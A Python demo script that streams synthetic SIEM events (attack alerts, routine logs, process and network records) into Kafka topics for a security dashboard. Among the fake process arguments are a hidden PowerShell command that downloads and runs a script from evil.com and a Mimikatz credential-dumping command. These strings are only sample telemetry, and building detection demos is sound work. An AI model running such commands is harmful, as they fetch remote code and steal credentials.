#!/usr/bin/env python3
"""
Live streaming demo — pushes realistic SIEM events through the full CLIF pipeline
at a visible pace so you can watch them arrive on the frontend dashboard.

Events are produced every 0.5-2s with clear, recognizable descriptions
so they're easy to spot in the Live Feed and Dashboard.
"""

import json
import os
import random
import time
import hashlib
from datetime import datetime, timezone
from confluent_kafka import Producer

BROKER = os.getenv("KAFKA_BROKER", "localhost:19092")

producer = Producer({
    "bootstrap.servers": BROKER,
    "acks": "all",
    "compression.type": "zstd",
    "linger.ms": 10,
})

DEMO_TAG = f"LIVE-DEMO-{datetime.now().strftime('%H%M%S')}"
seq = 0

# ── Realistic event scenarios ──────────────────────────────────────────────
ATTACK_SCENARIOS = [
    {"type": "Brute Force Login", "technique": "T1110.001", "severity": 8,
     "desc": "Multiple failed SSH logins from 185.220.101.42 against admin account — possible brute force attack"},
    {"type": "Privilege Escalation", "technique": "T1078", "severity": 9,
     "desc": "User jdoe@corp.internal escalated to Domain Admin via compromised service account"},
    {"type": "Lateral Movement", "technique": "T1021.001", "severity": 7,
     "desc": "RDP session initiated from workstation WKS-0142 to domain controller DC-01 using stolen credentials"},
    {"type": "Data Exfiltration", "technique": "T1041", "severity": 10,
     "desc": "Unusual outbound data transfer of 2.4GB to external IP 91.234.56.78 via HTTPS tunnel"},
    {"type": "Malware Detected", "technique": "T1059.001", "severity": 9,
     "desc": "PowerShell encoded command execution detected on SRV-DB02 — matches Cobalt Strike beacon pattern"},
    {"type": "Credential Dumping", "technique": "T1003.001", "severity": 10,
     "desc": "LSASS memory access detected from unknown process on SRV-APP01 — possible Mimikatz activity"},
    {"type": "Phishing Click", "technique": "T1566.001", "severity": 6,
     "desc": "User msmith clicked suspicious link in email from spoofed sender hr-department@c0rp.com"},
    {"type": "Ransomware Indicator", "technique": "T1486", "severity": 10,
     "desc": "Mass file encryption detected on FILE-SRV03 — .locked extension appended to 847 files in 30 seconds"},
]

NORMAL_LOGS = [
    "Firewall ALLOW: TCP 10.0.5.22:49832 → 172.16.1.10:443 (HTTPS)",
    "DNS query: srv-web04.corp.internal → 10.0.0.53 (A record, 2ms)",
    "User login successful: admin@corp.internal from 10.0.3.15 via SSO",
    "Scheduled backup completed: database clif_logs → S3 bucket clif-backups (12.4GB, 00:04:22)",
    "Certificate renewal: *.corp.internal — new expiry 2027-02-13",
    "Windows Update: KB5034441 installed on 142 endpoints",
    "IDS signature match: ET SCAN Potential SSH Scan (low confidence, informational)",
    "DHCP lease renewed: 10.0.8.201 → WKS-0087 (MAC: 00:1A:2B:3C:4D:5E)",
    "Proxy: ALLOW category=Business user=jdoe dst=github.com bytes=245KB",
    "Load balancer health check: all 6 backend servers healthy (avg response 12ms)",
]

USERS = ["admin", "jdoe", "msmith", "agarcia", "kwilson", "rbrown", "lchen", "pjones"]
HOSTS = ["SRV-WEB01", "SRV-DB02", "SRV-APP01", "DC-01", "WKS-0142", "WKS-0087", "FILE-SRV03", "SRV-MAIL01"]
SOURCES = ["firewall", "ids", "endpoint", "waf", "syslog", "auth-server", "dns-server", "proxy"]


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def send_security_event():
    global seq
    seq += 1
    scenario = random.choice(ATTACK_SCENARIOS)
    event = {
        "timestamp": now_iso(),
        "event_type": scenario["type"],
        "source_ip": f"{random.choice([10,172,192])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "destination_ip": f"10.0.{random.randint(0,10)}.{random.randint(1,254)}",
        "username": random.choice(USERS),
        "hostname": random.choice(HOSTS),
        "severity": scenario["severity"],
        "description": f"[{DEMO_TAG}] {scenario['desc']}",
        "ai_confidence": round(random.uniform(0.75, 0.99), 3),
        "mitre_technique": scenario["technique"],
        "metadata": {"benchmark_tag": DEMO_TAG, "seq": seq, "demo": "true"},
    }
    producer.produce("security-events", json.dumps(event).encode(), callback=_cb)
    return f"🔴 SECURITY [{scenario['severity']}/10] {scenario['type']}: {scenario['desc'][:80]}..."


def send_raw_log():
    global seq
    seq += 1
    msg = random.choice(NORMAL_LOGS)
    event = {
        "timestamp": now_iso(),
        "level": random.choice(["INFO", "INFO", "INFO", "WARNING"]),
        "source": random.choice(SOURCES),
        "message": f"[{DEMO_TAG}] {msg}",
        "metadata": {"benchmark_tag": DEMO_TAG, "seq": seq, "demo": "true"},
    }
    producer.produce("raw-logs", json.dumps(event).encode(), callback=_cb)
    return f"📋 RAW LOG: {msg[:80]}"


def send_process_event():
    global seq
    seq += 1
    is_suspicious = random.random() < 0.3
    if is_suspicious:
        binary = random.choice([
            "C:\\Windows\\Temp\\svch0st.exe",
            "C:\\Users\\Public\\Downloads\\payload.exe",
            "C:\\Windows\\Temp\\mimikatz.exe",
            "C:\\ProgramData\\update.ps1",
        ])
        args = random.choice([
            "-encodedCommand SQBFAFgAIAAo...",
            "--dump lsass.dmp",
            "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
            "sekurlsa::logonpasswords",
        ])
    else:
        binary = random.choice([
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Program Files\\Chrome\\chrome.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Program Files\\Python312\\python.exe",
        ])
        args = f"--user {random.choice(USERS)}"

    event = {
        "timestamp": now_iso(),
        "hostname": random.choice(HOSTS),
        "pid": random.randint(1000, 65535),
        "ppid": random.randint(1, 5000),
        "uid": random.randint(1000, 65534),
        "gid": random.randint(1000, 65534),
        "binary_path": binary,
        "arguments": f"[{DEMO_TAG}] {args}",
        "cwd": f"C:\\Users\\{random.choice(USERS)}",
        "exit_code": 0,
        "container_id": "",
        "pod_name": "",
        "namespace": "windows",
        "syscall": "CreateProcess",
        "is_suspicious": 1 if is_suspicious else 0,
        "detection_rule": "demo_rule_001" if is_suspicious else "",
        "metadata": {"benchmark_tag": DEMO_TAG, "seq": seq, "demo": "true"},
    }
    producer.produce("process-events", json.dumps(event).encode(), callback=_cb)
    emoji = "⚠️" if is_suspicious else "⚙️"
    return f"{emoji} PROCESS: {binary.split(chr(92))[-1]} {args[:60]}"


def send_network_event():
    global seq
    seq += 1
    dst_port = random.choice([80, 443, 8080, 3306, 22, 3389, 53, 445, 8443])
    is_suspicious = dst_port in [3389, 445] and random.random() < 0.3
    event = {
        "timestamp": now_iso(),
        "hostname": random.choice(HOSTS),
        "src_ip": f"10.0.{random.randint(0,10)}.{random.randint(1,254)}",
        "src_port": random.randint(1024, 65535),
        "dst_ip": f"{'91.234' if is_suspicious else '10.0'}.{random.randint(0,255)}.{random.randint(1,254)}",
        "dst_port": dst_port,
        "protocol": "TCP" if dst_port != 53 else "UDP",
        "direction": "outbound",
        "bytes_sent": random.randint(64, 500_000),
        "bytes_received": random.randint(64, 500_000),
        "duration_ms": random.randint(1, 5000),
        "pid": random.randint(100, 65535),
        "binary_path": "",
        "container_id": "",
        "pod_name": "",
        "namespace": "enterprise",
        "dns_query": f"[{DEMO_TAG}] {random.choice(HOSTS).lower()}.corp.internal",
        "geo_country": random.choice(["US", "US", "US", "CN", "RU"]) if is_suspicious else "US",
        "is_suspicious": 1 if is_suspicious else 0,
        "detection_rule": "network_demo_001" if is_suspicious else "",
        "metadata": {"benchmark_tag": DEMO_TAG, "seq": seq, "demo": "true"},
    }
    producer.produce("network-events", json.dumps(event).encode(), callback=_cb)
    emoji = "🔴" if is_suspicious else "🌐"
    return f"{emoji} NETWORK: {event['src_ip']}:{event['src_port']} → {event['dst_ip']}:{dst_port} ({event['protocol']})"


def _cb(err, msg):
    if err:
        print(f"  ❌ Delivery failed: {err}")


# ── Main loop ──────────────────────────────────────────────────────────────

GENERATORS = [
    (send_security_event, 0.30),
    (send_raw_log, 0.30),
    (send_process_event, 0.20),
    (send_network_event, 0.20),
]

print("=" * 72)
print(f"  🔴 CLIF Live Streaming Demo — Tag: {DEMO_TAG}")
print("=" * 72)
print(f"  Kafka Broker: {BROKER}")
print(f"  Topics: security-events, raw-logs, process-events, network-events")
print(f"  Rate: ~1 event every 0.5-1.5 seconds")
print()
print("  ▶ Open your browser to see events appear:")
print("    • Dashboard:   http://localhost:3001/dashboard")
print("    • Live Feed:   http://localhost:3001/live-feed")
print("    • Alerts:      http://localhost:3001/alerts")
print("    • Search:      http://localhost:3001/search")
print()
print("  Press Ctrl+C to stop streaming")
print("=" * 72)
print()

try:
    while True:
        # Pick event type by weight
        gen_fn = random.choices(
            [g[0] for g in GENERATORS],
            weights=[g[1] for g in GENERATORS],
            k=1,
        )[0]

        desc = gen_fn()
        producer.poll(0)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"  [{ts}] #{seq:04d}  {desc}")

        # Small random delay to make it visible
        time.sleep(random.uniform(0.5, 1.5))

except KeyboardInterrupt:
    print(f"\n\n  Stopping... flushing {seq} events to Redpanda...")
    producer.flush(timeout=10)
    print(f"  ✅ Done! Streamed {seq} events with tag {DEMO_TAG}")
    print(f"  Check them on the dashboard: http://localhost:3001/live-feed")
